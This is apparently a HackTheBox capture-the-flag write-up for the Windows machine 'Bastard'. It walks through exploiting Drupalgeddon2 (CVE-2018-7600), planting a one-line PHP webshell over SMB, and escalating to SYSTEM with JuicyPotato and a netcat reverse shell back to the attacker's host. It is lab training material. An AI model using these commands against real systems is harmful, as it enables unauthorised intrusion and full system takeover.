
# Bastard

**Platform:** HackTheBox  
**OS:** Windows  
**Difficulty:** Medium  
**Date:** April 2026

---

## Summary

Windows machine running Drupal 7.54, vulnerable to Drupalgeddon2
(CVE-2018-7600), an unauthenticated remote code execution vulnerability.
Initial access obtained via RCE. Privilege escalation achieved by
abusing SeImpersonatePrivilege with JuicyPotato.

---

## 1. Reconnaissance

Full port scan:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.22.229 -oG allPorts


Open ports:



|Port |Service |
|-----|--------|
|80   |HTTP IIS|
|135  |MSRPC   |
|49154|MSRPC   |

TTL=127 confirms Windows target.
Detailed scan:

nmap -sCV -Pn -p80 10.129.22.229 -oN targeted


2. Web Enumeration
Ran Nikto against the web server:

nikto -h http://10.129.22.229


Found robots.txt with 68 entries. Checked CHANGELOG.txt:

curl http://10.129.22.229/CHANGELOG.txt | head -5


Identified Drupal 7.54.

3. Exploitation — CVE-2018-7600 (Drupalgeddon2)
Cloned exploit:

git clone https://github.com/pimps/CVE-2018-7600
cd CVE-2018-7600
pip install requests --break-system-packages


Confirmed RCE:

python3 drupa7-CVE-2018-7600.py -c "whoami" http://10.129.22.229
# nt authority\iusr


Checked privileges:

python3 drupa7-CVE-2018-7600.py -c "whoami /priv" http://10.129.22.229
# SeImpersonatePrivilege Enabled


4. Webshell Upload via SMB
HTTP transfers blocked by Windows firewall. Used SMB instead.
Created PHP webshell:

echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php


Served via SMB:

sudo impacket-smbserver share /tmp -smb2support


Found Drupal installation path:

python3 drupa7-CVE-2018-7600.py -c "where /r C:\\ index.php" http://10.129.22.229
# C:\inetpub\drupal-7.54\index.php


Copied webshell to web root:

python3 drupa7-CVE-2018-7600.py \
-c "copy \\\\<IP>\\share\\shell.php C:\\inetpub\\drupal-7.54\\shell.php" \
http://10.129.22.229


Verified RCE via browser:

http://10.129.22.229/shell.php?cmd=whoami
# nt authority\iusr


Retrieved user flag:

http://10.129.22.229/shell.php?cmd=type+C:\Users\dimitris\Desktop\user.txt


5. Privilege Escalation — JuicyPotato
Downloaded and transferred JuicyPotato via SMB:

wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe \
-O /tmp/JuicyPotato.exe


http://10.129.22.229/shell.php?cmd=copy+\\<IP>\share\JuicyPotato.exe+C:\Windows\Temp\jp.exe
http://10.129.22.229/shell.php?cmd=copy+\\<IP>\share\nc.exe+C:\Windows\Temp\nc.exe


Created bat file for reverse shell:

http://10.129.22.229/shell.php?cmd=echo+C:\Windows\Temp\nc.exe+-e+cmd.exe+<IP>+443+>+C:\Windows\Temp\cmd.bat


Started listener:

sudo nc -lvnp 443


Executed JuicyPotato:

http://10.129.22.229/shell.php?cmd=C:\Windows\Temp\jp.exe+-t+*+-p+C:\Windows\Temp\cmd.bat+-l+9999+-c+{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}


Received shell as NT AUTHORITY\SYSTEM.
Retrieved root flag:

type C:\Users\Administrator\Desktop\root.txt


6. Flags
	•	user.txt ✅
	•	root.txt ✅

Tools Used



|Tool                 |Purpose                     |
|---------------------|----------------------------|
|nmap                 |Port and service enumeration|
|Nikto                |Web vulnerability scanning  |
|CVE-2018-7600 exploit|Drupalgeddon2 RCE           |
|impacket-smbserver   |File transfer to target     |
|JuicyPotato          |SeImpersonatePrivilege abuse|
|netcat               |Reverse shell listener      |

Vulnerabilities Found



|Vulnerability              |Description                        |
|---------------------------|-----------------------------------|
|CVE-2018-7600 Drupalgeddon2|Unauthenticated RCE in Drupal 7.54 |
|SeImpersonatePrivilege     |Token impersonation via JuicyPotato|
|Information Disclosure     |Version exposed in CHANGELOG.txt   |


